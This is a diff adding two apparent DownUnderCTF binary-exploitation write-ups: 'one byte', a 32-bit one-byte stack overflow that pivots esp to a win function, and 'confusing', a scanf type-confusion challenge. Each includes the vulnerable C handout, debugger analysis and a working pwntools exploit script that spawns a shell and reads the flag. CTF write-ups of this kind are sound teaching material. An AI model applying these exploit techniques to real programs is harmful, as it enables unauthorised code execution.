@@ -601,3 +601,151 @@ print(bytes(flag).decode())
 This challenge took around 5 minutes to solve.
 
 Flag: `DUCTF{r3c0nstruct10n_0f_fl4g_fr0m_fl4g_4r7_by_l00kup_t4bl3_0r_ch1n3s3_r3m41nd3r1ng?}`
+
+## one byte
+
+We get the following challenge handout;
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+void init() {
+    setvbuf(stdout, 0, 2, 0);
+    setvbuf(stdin, 0, 2, 0);
+}
+
+void win() {
+    system("/bin/sh");
+}
+
+int main() {
+    init();
+
+    printf("Free junk: 0x%lx\n", init);
+    printf("Your turn: ");
+
+    char buf[0x10];
+    read(0, buf, 0x11);
+} 
+```
+
+As the challenge name hints at, we only get a one byte overflow. I was a little confused how this was evenly remotely possible until I checked the binary with checksec;
+
+```
+Arch:       i386-32-little
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        PIE enabled
+Stripped:   No  
+```
+
+It turns out that the binary is 32 bit!
+
+Unfortunately for me, I haven't done any 32 bit stuff in quite a while, so I needed a bit of a refresher. I probably could've looked up 32 bit pwn resources online, but I generally find that figuring things out for myself is much more valuable, so I ran the program under GDB instead and started poking.
+
+First I set a breakpoint just before the `read` to check out the layout of the stack around the buffer that we get to write to. Immediately after our buffer there is a stack address of some sort, which I assumed was probably the saved ebp (I was wrong).
+
+Once I had seen the layout of the stack, I set a breakpoint at the end of main just before it started doing the function return dance;
+
+```asm
+    0x5664028e <+96>:    mov    eax,0x0
+ => 0x56640293 <+101>:   lea    esp,[ebp-0x8]
+    0x56640296 <+104>:   pop    ecx
+    0x56640297 <+105>:   pop    ebx
+    0x56640298 <+106>:   pop    ebp
+    0x56640299 <+107>:   lea    esp,[ecx-0x4]
+    0x5664029c <+110>:   ret
+```
+
+As I stepped through I discovered that the value that we partially control on the stack makes its way into esp (offset by 4) right before the function returns. The x86 `ret` instruction pops the return address off the stack, so we effectively return to whatever lives at `our_partially_controlled_value - 0x4`. Under normal operation, the return address is stored between the current stack frame and the one below, so it should be stored near our buffer. That's good for us because it means that our buffer should be within a one byte change of the original address.
+
+My exploit strategy was to fill the buffer with the `win` address (which we can easily compute from the `init` address that the program leaks for us) and then overwrite the least significant byte of the saved `esp` address with an arbitrary fixed value (in my case `\x20`) and hope that the stack slide works out such that the tweaked `esp` value points to one of our return addresses. The stack slide is randomised for each process, so we can just retry the exploit until we get a hit. Note that we don't actually have to spam the `win` address, because on a successful exploit our controlled esp will always line up with the 4th copy of the win address due to the way things align, but in the moment it was easier to just spam them rather than think it through.
+
+```py
+from pwn import process, ELF, cyclic, pause, p32
+
+bin = ELF("./onebyte")
+offset = bin.symbols["win"] - bin.symbols["init"]
+
+p = process("./onebyte")
+
+p.recvuntil(b"junk: ")
+leak = int(p.recvline().strip().decode()[2:], 16)
+win = leak + offset
+
+p.send(p32(win) * 4 + b"\x20")
+p.sendline(b"cat flag.txt")
+p.sendline(b"exit")
+print(p.recvall())
+```
+
+This challenge took me around 40 minutes to solve. I haven't done 32 bit stuff properly for ages, so I had to fill gaps in my mental model with GDB. Overall I feel like this challenge taught me a surprising amount for a 'baby' challenge!
+
+Flag: `DUCTF{all_1t_t4k3s_is_0n3!}`
+
+## confusing
+
+Here's the handout that we get (with some unrelated bits omitted);
+
+```c
+int main() {
+    short d;
+    double f;
+    char s[4];
+    int z; 
+
+    printf("Give me d: ");
+    scanf("%lf", &d);
+
+    printf("Give me s: ");
+    scanf("%d", &s);
+
+    printf("Give me f: ");
+    scanf("%8s", &f);
+
+    if(z == -1 && d == 13337 && f == 1.6180339887 && strncmp(s, "FLAG", 4) == 0) {
+        system("/bin/sh");
+    }
+}
+```
+
+This is clearly a 'skill check'-type challenge rather than an exploitation one. The challenge is testing whether we can manipulate type confusions effectively in C.
+
+In challenge like these where the layout of the stack is important, it can be a good idea to check the stack layout with a decompiler such as Binary Ninja instead of trying to guess the stack layout yourself, because compilers do all sorts of funny things.
+
+In our case, `d` is at `rbp-0x26`, `z` is at `rbp-0x24`, `s` is at `rbp-0x14`, and `f` is at `rbp-0x20`.
+
+The first write we get overrides `d`, `z`, and two bytes of `f`. We later get to overwrite `f` in full, so we only have to worry about `d` and `z` for now. We want `d` to be 13337 (0x3419) and `z` to be `-1` (0xffffffff). Therefore we want the bitpattern of the value we provide to be `0x6767_ffff_ffff_3419` (where the 0x6767 part is unconstrained). We have to provide the value as a double, so we need to choose our upper two bytes such that the value represents a valid double. I tried `ffff` and that gave me NaN (no good). Then I tried `0000` and that worked a charm. The double value corresponding to `0x0000_ffff_ffff_3419` is `1.390671161309104e-309` (and scanf luckily supports `e` notation when parsing floating point numbers).
+
+> [!NOTE]
+> I enjoy Swift's integer/floating point APIs, so I actually did the initial experimentation in a Swift REPL. I typed `Double(bitPattern: 0x0000_ffff_ffff_3419)` to retrieve the double value corresponding to the bytes I wanted. It was only later while cleaning up the solve script for this writeup that I replace the hardcoded double value from my Swift experimentation with a value dynamically computed using the `struct` library (and emulating what that simple Swift expression was doing).
+
+Next we get to write a 4 byte integer to `s`, which has to have the value `"FLAG"`. This is pretty standard in binary exploitation, and we can use `u32` to achieve the conversion from bytes to integer that we want.
+
+Finally we get to write an 8 byte string to `f`, and `f` needs to have the value `1.6180339887` (which is the golden ratio). We can use `struct.pack` to convert our target value to bytes.
+
+Putting it all together, we get the following solve script;
+
+```python
+import struct
+from pwn import process, u32
+
+p = process("./confusing")
+
+# swift equiv: Double(bitPattern: 0x0000_ffff_ffff_3419)
+xs = 0x0000_ffff_ffff_3419.to_bytes(8, byteorder="little")
+p.sendlineafter(b"d: ", str(struct.unpack("<d", xs)[0]).encode())
+p.sendlineafter(b"s: ", str(u32(b"FLAG")).encode())
+p.sendlineafter(b"f: ", struct.pack("<d", 1.6180339887))
+
+p.sendline(b"cat flag.txt")
+p.sendline(b"exit")
+print(p.recvall().strip().decode())
+```
+
+This challenge took around 10 minutes.
+
+Flag: `DUCTF{typ3_c0nfus1on_c4n_b3_c0nfus1ng!}`
